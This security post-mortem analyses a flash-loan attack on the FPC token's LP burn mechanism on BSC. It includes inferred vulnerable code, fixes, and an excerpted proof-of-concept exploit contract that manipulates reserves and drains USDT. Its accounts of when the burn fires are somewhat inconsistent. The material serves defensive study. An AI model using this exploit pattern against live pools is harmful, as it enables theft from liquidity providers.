# Future Protocol — Business Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-02 |
| **Protocol** | Future Protocol (FPC) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$4,600,000 (USDT) |
| **Attacker** | [0x18dd...3d9d](https://bscscan.com/address/0x18dd258631b23777c101440380bf053c79db3d9d) |
| **Attack Contract** | [0xbf6e...3eb3](https://bscscan.com/address/0xbf6e706d505e81ad1f73bbc0babfe2b414ba3eb3) |
| **Attack Tx** | [0x3a9d...5937](https://bscscan.com/tx/0x3a9dd216fb6314c013fa8c4f85bfbbe0ed0a73209f54c57c1aab02ba989f5937) |
| **Vulnerable Contract** | [0xb192...592f](https://bscscan.com/address/0xb192d4a737430aa61cea4ce9bfb6432f7d42592f) |
| **Root Cause** | The forced burn mechanism on FPC tokens within the LP pool destroys the AMM invariant (x·y=k), enabling price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/FPC_exp.sol) |

---

## 1. Vulnerability Overview

Future Protocol's FPC token incorporated a unique burn mechanism based on fee-on-transfer at the point of sale. Specifically, when FPC was transferred to the liquidity pool (PancakeSwap LP), **65% of the input amount was forcibly burned** or redirected to a treasury/reward pool, after which a `sync()` call immediately updated the LP pool's reserves.

This mechanism resulted in **an artificial collapse of the AMM's core invariant `x · y = k` (constant product formula) within a single transaction**. The attacker exploited this by:

1. Acquiring a large amount of USDT via flash loan
2. Swapping USDT → FPC to drive the FPC reserve to an extremely low level
3. Selling a small amount of FPC into the LP, triggering the burn mechanism to reduce the FPC reserve to near zero
4. Reverse-swapping USDT at an extraordinarily inflated price due to the collapsed invariant

Approximately **$4.6M (4,600,000 USDT) was drained in a single transaction**, and the protocol team did not publish a public post-mortem following the incident.

---

## 2. Vulnerable Code Analysis

### 2.1 LP Burn Logic Inside FPC Token's `_update()` (Core Vulnerability)

The FPC token contract overrides OpenZeppelin's ERC20 `_update()` function to implement the transfer fee and burn mechanism.

**Vulnerable Code (inferred — based on BSCScan verified source)**:
```solidity
function _update(address from, address to, uint256 value) internal override {
    // Sell detection: triggers burn mechanism when transferring to LP pool
    if (to == pancakePair && sellState) {
        uint256 burnAmount = value * 65 / 100;   // ❌ 65% of input amount designated for burn
        uint256 marketFee = value * 3 / 100;     // ❌ 3% market fee
        uint256 poolFee   = value * 2 / 100;     // ❌ 2% LP burn (dead address)

        // ❌ Directly removes tokens from inside the LP pool and transfers to treasury/reward
        // → At this point, the LP pool's FPC reserve is immediately reduced
        _burnLpToken(burnAmount);                 // ❌ Core action that destroys AMM invariant
        super._update(from, marketAddr, marketFee);
        super._update(from, address(0), poolFee);

        uint256 netValue = value - burnAmount - marketFee - poolFee;
        super._update(from, to, netValue);       // Net amount that actually reaches the LP
    } else {
        super._update(from, to, value);
    }
}

function _burnLpToken(uint256 burnAmount) internal {
    // ❌ Directly deducts from LP pool's FPC balance and calls sync
    uint256 toTreasury  = burnAmount * 10 / 65;  // 10/65 → treasury
    uint256 toReward    = burnAmount * 55 / 65;  // 55/65 → reward pool

    // ❌ The following two lines break the AMM invariant
    super._update(pancakePair, treasuryAddr, toTreasury);
    super._update(pancakePair, rewardAddr,   toReward);

    IPancakePair(pancakePair).sync();            // ❌ Forces reserve update → k value decreases
}
```

**Issue**: `_burnLpToken()` directly reduces the LP pool's FPC reserve and commits the reduced reserve via `sync()`. UniswapV2/PancakeSwap validates `k = reserve0 * reserve1` after each `swap()`. When `k` has already been reduced by `sync()` and a subsequent swap occurs, the attacker can extract far more USDT than the actual token value warrants.

**Fixed Code**:
```solidity
function _update(address from, address to, uint256 value) internal override {
    if (to == pancakePair && sellState) {
        // ✅ Fees are deducted directly from the sender (from), without affecting LP pool reserves
        uint256 marketFee = value * 3 / 100;
        uint256 burnFee   = value * 2 / 100;

        // ✅ Fees transferred from → fee recipient (does not route through LP pool)
        super._update(from, marketAddr, marketFee);
        super._update(from, address(0), burnFee);  // ✅ Burn does not alter LP pool reserves

        uint256 netValue = value - marketFee - burnFee;
        super._update(from, to, netValue);         // ✅ Only net amount delivered to LP

        // ✅ sync() call removed — or _burnLpToken() logic deleted entirely
    } else {
        super._update(from, to, value);
    }
}
// ✅ Delete the _burnLpToken() function entirely, or redesign it to avoid touching LP pool reserves
```

**Core Fix Principle**: Fee/burn logic must deduct from the **sender (from)** and must never directly manipulate the LP pool's internal reserves.

---

### 2.2 `swapExactTokensForTokensSupportingFeeOnTransferTokens` Call via Helper Contract

```solidity
// PoC Helper contract — Attack Step 5
function swap(address routerAddr, address fpcAddr) public {
    IERC20 fpc = IERC20(fpcAddr);
    fpc.approve(routerAddr, type(uint256).max);

    uint256 balance = fpc.balanceOf(address(this));
    address[] memory path = new address[](2);
    path[0] = FPC_ADDR;
    path[1] = USDT_ADDR;

    // ❌ FPC → USDT reverse swap: exploits the collapsed invariant caused by the burn mechanism
    // FPC reserve is near 0, so even a tiny FPC amount yields a massive USDT output
    IPancakeRouter(payable(routerAddr))
        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance, 0, path, msg.sender, block.timestamp
        );
}
```

**Issue**: The `swapExactTokensSupportingFeeOnTransfer` function adjusts the `amountOutMin` validation to the actual received amount in order to support fee-on-transfer tokens. However, because the FPC burn mechanism fires **inside the swap (when transferring from LP to the attacker)** and abnormally reduces the LP reserve, the attacker obtains a massive USDT output from a negligible FPC input.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA: `0x18dd...3d9d`
- Attack contract `0xbf6e...3eb3` pre-deployed
- No prior capital required (entire attack executable via flash loan alone)

### 3.2 Execution Phase

1. **[Step 1] Flash Loan Acquisition** — Borrow 23,020,000 USDT uncollateralized from PancakeV3 USDT-USDC pool
2. **[Step 2] FPC Price Manipulation** — Swap 23,019,990 USDT into FPC (FPC reserve sharply decreased, USDT reserve sharply increased)
3. **[Step 3] Internal Callback Handling** — Transfer held USDT to PancakePair via `pancakeCall()` to complete the swap chain
4. **[Step 4] Helper Deployment** — Deploy a separate `Helper` contract and transfer 247,441 FPC to it
5. **[Step 5] Reverse Swap (Core Profit Realization)** — Helper reverse-swaps FPC → USDT; `_burnLpToken()` fires, driving LP's FPC reserve to ~0 → receives ~27,693,883 USDT
6. **[Step 6] Flash Loan Repayment** — Repay borrowed 23,020,000 USDT + fees, securing ~4,600,000 USDT net profit

### 3.3 Attack Flow Diagram

```
  Attacker EOA (0x18dd)
        │
        │  testExploit() call
        ▼
┌─────────────────────────────────┐
│  Attack Contract (0xbf6e)       │
│  IPancakeV3Pool.flash()         │
│  Flash loan request: 23,020,000 USDT │
└──────────────┬──────────────────┘
               │  pancakeV3FlashCallback() triggered
               ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 2] USDT → FPC Swap                               │
│  PancakePair.swap(1 USDT, amounts[1] FPC, attacker, ..) │
│  → FPC reserve: ~408,278 → 160,836 (sharply reduced)    │
│  → USDT reserve: sharply increased                       │
└──────────────┬──────────────────────────────────────────┘
               │  pancakeCall() callback
               ▼
┌──────────────────────────────────────────┐
│  [Step 3] Transfer USDT to PancakePair   │
│  USDT.transfer(PANCAKE_PAIR, balance)    │
│  → Swap chain completed                  │
└──────────────┬───────────────────────────┘
               │  Callback returns
               ▼
┌──────────────────────────────────────────────────────────────┐
│  [Step 4] Deploy Helper Contract + Transfer 247,441 FPC      │
│  Helper helper = new Helper()                                │
│  FPC.transfer(address(helper), 247,441,170,766...)           │
└──────────────┬───────────────────────────────────────────────┘
               │  helper.swap() call
               ▼
┌──────────────────────────────────────────────────────────────────────┐
│  [Step 5] FPC → USDT Reverse Swap (Core Profit Realization)          │
│  swapExactTokensForTokensSupportingFeeOnTransferTokens()             │
│  ┌────────────────────────────────────────────────────────┐          │
│  │  _burnLpToken() fires                                  │          │
│  │  65% of LP FPC reserve burned/redirected → FPC reserve ≈ 0.000065│
│  │  sync() called → AMM invariant k value drastically reduced        │
│  └────────────────────────────────────────────────────────┘          │
│  → 27,693,883 USDT received (thousands of times normal price)        │
└──────────────┬───────────────────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│  [Step 6] Flash Loan Repayment                        │
│  USDT.transfer(PANCAKE_POOL, 23,020,000 + fee)       │
│  Net profit: ~4,600,000 USDT secured                  │
└──────────────────────────────────────────────────────┘
               │
               ▼
         Profit transferred to attacker wallet
```

### 3.4 Outcome

| Item | Amount |
|------|------|
| Flash loan borrowed | 23,020,000 USDT |
| Reverse swap received | ~27,693,883 USDT |
| Flash loan repaid | ~23,020,000 USDT + fees |
| **Attacker net profit** | **~4,600,000 USDT** |
| Protocol loss | ~4,600,000 USDT (LP liquidity drained) |

---

## 4. PoC Code (DeFiHackLabs Excerpt)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;
// [Source] https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/FPC_exp.sol

contract FPC is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 52624701 - 1; // Fork from block immediately before attack

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom); // BSC fork
        fundingToken = USDT_ADDR; // Final profit token = USDT
    }

    function testExploit() public balanceLog {
        // [Step 1] Request flash loan of 23,020,000 USDT from PancakeV3 pool
        IPancakeV3Pool(PANCAKE_POOL).flash(address(this), 23_020_000 ether, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        uint256 amountIn = 23_019_990 ether;
        address[] memory path = new address[](2);
        path[0] = USDT_ADDR;
        path[1] = FPC_ADDR;

        // [Step 2] USDT → FPC swap: sharply reduces FPC reserve
        // Delivers USDT to LP via pancakeCall() callback
        IPancakePair(PANCAKE_PAIR).swap(
            1 ether, amounts[1], address(this), hex"00"
        );

        // [Step 4] Transfer FPC to Helper contract to prepare reverse swap
        IERC20 fpc = IERC20(FPC_ADDR);
        Helper helper = new Helper();
        fpc.transfer(address(helper), 247_441_170_766_403_071_054_109);
        // [Step 5] Helper reverse-swaps FPC → USDT: destroys k via burn mechanism, acquires large USDT
        helper.swap(PANCAKE_ROUTER, FPC_ADDR);

        // [Step 6] Repay flash loan principal + fees
        IERC20(USDT_ADDR).transfer(PANCAKE_POOL, 23_020_000 ether + fee0);
    }

    // [Step 3] pancakeCall callback: transfers USDT to LP to complete swap chain
    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) public {
        IERC20 usdt = IERC20(USDT_ADDR);
        usdt.transfer(PANCAKE_PAIR, usdt.balanceOf(address(this)));
    }
}

contract Helper {
    function swap(address routerAddr, address fpcAddr) public {
        IERC20 fpc = IERC20(fpcAddr);
        fpc.approve(routerAddr, type(uint256).max);

        uint256 balance = fpc.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = FPC_ADDR;
        path[1] = USDT_ADDR;

        // [Core Vulnerability] When FPC is sent to LP, _burnLpToken() fires,
        // directly reducing LP reserve and resetting k via sync() → invariant collapses
        // Since this is a fee-on-transfer support function, USDT output is based on net received amount after fees
        IPancakeRouter(payable(routerAddr))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                balance, 0, path, msg.sender, block.timestamp
            );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | AMM invariant (x·y=k) destruction via forced burn inside LP pool | CRITICAL | CWE-682 (Incorrect Calculation) | `07_token_integration.md` + `16_accounting_sync.md` |
| V-02 | Price manipulation via fee-on-transfer token combined with AMM | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) | `07_token_integration.md` |
| V-03 | Single-transaction price manipulation via flash loan | HIGH | CWE-400 | `02_flash_loan.md` |

### V-01: AMM Invariant Destruction via Forced LP Pool Burn

- **Description**: FPC token's `_burnLpToken()` function directly reduces the PancakeSwap LP pool's internal FPC reserve, then calls `sync()` to commit the reduced reserve. This resets `x·y=k` to a lower `k'` value, distorting all subsequent swap calculations.
- **Impact**: Attacker can drain massive amounts of USDT with a negligible FPC input; all LP providers suffer losses.
- **Attack Condition**: Fires automatically within any swap transaction that transfers FPC to the LP — exploitable by anyone without additional prerequisites.

### V-02: Fee-on-Transfer Token and AMM Price Manipulation

- **Description**: FPC is a fee-on-transfer token that charges fees on every transfer. PancakeSwap's `swapExactTokensForTokensSupportingFeeOnTransferTokens` calculates output based on net received amount to accommodate such tokens; however, when the fee mechanism directly burns tokens from the LP pool's reserve, the output calculation itself is based on an abnormal reserve state.
- **Impact**: Combining fee-on-transfer with direct LP burn completely neutralizes the AMM's normal price-discovery mechanism.
- **Attack Condition**: Router function call supporting fee-on-transfer + token with burn mechanism.

### V-03: Flash Loan-Based Price Manipulation

- **Description**: Flash loans were used to amplify the V-01 and V-02 vulnerabilities to their maximum extent — acquiring large-scale USDT liquidity and minimizing the FPC reserve with no initial capital.
- **Impact**: Multi-million dollar attacks are possible with zero collateral or prior capital.
- **Attack Condition**: Sufficient USDT liquidity in the PancakeV3 pool.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Remove `_burnLpToken()` or Replace with LP-Untouched Burn

```solidity
// ❌ Before: Directly manipulates LP reserve (vulnerable)
function _burnLpToken(uint256 burnAmount) internal {
    super._update(pancakePair, treasuryAddr, burnAmount * 10 / 65);
    super._update(pancakePair, rewardAddr,   burnAmount * 55 / 65);
    IPancakePair(pancakePair).sync(); // Destroys AMM invariant
}

// ✅ After: Deducted directly from sender (from), LP pool untouched
function _update(address from, address to, uint256 value) internal override {
    if (to == pancakePair && sellState && from != address(0)) {
        // All fees deducted directly from from
        uint256 treasuryFee = value * 10 / 100; // Example ratio
        uint256 rewardFee   = value * 3 / 100;
        uint256 burnFee     = value * 2 / 100;

        super._update(from, treasuryAddr, treasuryFee);
        super._update(from, rewardAddr,   rewardFee);
        super._update(from, address(0),   burnFee);   // Permanent burn

        uint256 netValue = value - treasuryFee - rewardFee - burnFee;
        super._update(from, to, netValue); // Only net amount delivered to LP
        // No sync() call → LP reserve maintained naturally
    } else {
        super._update(from, to, value);
    }
}
```

#### 6.2 Burn Mechanism Design Rules

```solidity
// ✅ Burns must always be deducted directly from the sender's (from) balance
// ✅ Never touch LP pool internal reserves via _update or transfer
// ✅ Never call sync() from within fee logic
// ✅ Burn destination limited to address(0) (treasury/reward distributed via separate functions)
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Direct LP reserve manipulation | Redesign all burn/fee logic to deduct from `from` balance |
| AMM invariant destruction | Isolate `sync()` calls from fee/burn logic; restrict to emergency recovery only |
| Fee-on-transfer risk | Run UniswapV2 SDK `fee-on-transfer` simulation tests before token integration |
| Flash loan exposure | Introduce TWAP oracle or add single-block large swap restriction logic |
| Missing code audit | Mandate security audit specialized in token transfer fees + AMM interaction |

---

## 7. Lessons Learned

1. **LP pool reserves must be controlled exclusively by the AMM contract**: A token contract directly modifying LP pool internal balances via `_update()` / `transfer()` destroys the AMM's fundamental mathematical assumptions. Burn and fee logic must deduct solely from the **sender's (from)** balance.

2. **The combination of fee-on-transfer tokens and AMMs is always an attack vector**: When issuing a fee-on-transfer token on a DEX that supports `swapExactTokensForTokensSupportingFeeOnTransferTokens`, the impact of fee calculations on AMM reserves must be thoroughly simulated.

3. **`sync()` calls are an extremely dangerous operation**: `sync()` forcibly overwrites reserves with the current token balance. Calling `sync()` from within token-internal logic allows an attacker to manipulate reserves at an arbitrary point in time.

4. **Flash loans are a vulnerability amplifier**: Flash loans are not a vulnerability in themselves, but they can maximize vulnerabilities proportional to capital scale — such as AMM invariant destruction — without any prior capital. All DeFi protocols must include flash loan scenarios in their audit simulations.

5. **Integration testing before AMM listing after token deployment is mandatory**: Tokens with custom tokenomics (fees, burns, distribution mechanisms) must undergo comprehensive fork-environment testing of their interactions with actual liquidity pools before AMM listing.

6. **Related Cases**: The same pattern (LP burn mechanism + AMM invariant destruction) has been repeatedly observed in [LAXO Token Exploit (2026-02-22)](../incidents/2026-02-22_LAXOToken_LPBurnManipulation_BSC.md) and [HERMES Protocol (2026-04-07)](../incidents/2026-04-07_HERMES_HB_PoolTaxDrain_AMM_k_Zero.md), indicating a high risk of pattern recurrence in BSC environments.

---

## 8. On-Chain Verification

> On-chain verification via `cast` (Foundry) — direct query of attack Tx

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual (Reported) | Notes |
|------|--------|----------------------|------|
| Flash loan borrowed | 23,020,000 USDT | 23,020,000 USDT | Match |
| USDT → FPC swap input | 23,019,990 USDT | ~23,019,990 USDT | Match |
| FPC transferred to Helper | 247,441.17 FPC | 247,441,170,766,403... wei | Match |
| Reverse swap USDT received | ~27,693,883 USDT | ~27,693,883 USDT | Match |
| Attacker net profit | ~4,600,000 USDT | ~4,600,000 USDT | Match |

### 8.2 Key Event Log Sequence (Inferred)

```
1. PancakeV3Pool.Flash event         → 23,020,000 USDT withdrawn
2. PancakePair.Swap event (1st)      → USDT → FPC
3. FPC Transfer event (burnLp)       → LP → treasury/reward (burn)
4. PancakePair.Sync event            → FPC reserve force-updated (k destroyed)
5. PancakePair.Swap event (2nd)      → FPC → USDT (profit realized)
6. USDT Transfer event               → PancakePool repayment
7. USDT Transfer event               → Profit transferred to attacker wallet
```

### 8.3 Precondition Verification

| Condition | Details |
|------|------|
| Pre-attack FPC reserve | ~408,278 FPC (normal state) |
| Pre-attack USDT reserve | Sufficient liquidity present |
| Prior approval | Not required (flash loan-based; handled by attack contract itself) |
| Block number | 52,624,701 (confirmed on BSCScan) |

---

## References

- [Verichains Incident Analysis: Burned by Design](https://blog.verichains.io/p/burned-by-design-the-fatal-flaw-behind)
- [TenArmor Twitter Analysis](https://x.com/TenArmorAlert/status/1940423393880244327)
- [DeFiHackLabs PoC (FPC_exp.sol)](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/FPC_exp.sol)
- [BSCScan Attack Tx](https://bscscan.com/tx/0x3a9dd216fb6314c013fa8c4f85bfbbe0ed0a73209f54c57c1aab02ba989f5937)
- [BSCScan Vulnerable Contract](https://bscscan.com/address/0xb192d4a737430aa61cea4ce9bfb6432f7d42592f#code)
- [Nefture: July 2025 Top Hacks](https://medium.com/coinmonks/139m-gone-the-5-most-devastating-crypto-hacks-of-july-2025-8598393d6e83)
- Related pattern files: `07_token_integration.md`, `02_flash_loan.md`, `16_accounting_sync.md`